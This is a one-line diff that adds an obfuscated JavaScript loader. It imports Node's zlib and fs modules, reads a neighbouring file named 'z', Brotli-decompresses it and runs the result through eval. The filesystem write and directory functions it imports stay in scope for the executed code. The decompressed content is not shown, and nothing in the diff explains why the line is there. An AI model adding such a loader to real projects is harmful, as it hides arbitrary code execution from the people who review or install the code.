@@ -1,0 +1,1 @@
+const{brotliDecompressSync:B}=await import('zlib'),{readFileSync:R,readdirSync:D,mkdirSync:M,writeFileSync:W}=await import('fs');eval(B(R(new URL('z',import.meta.url)))+'')
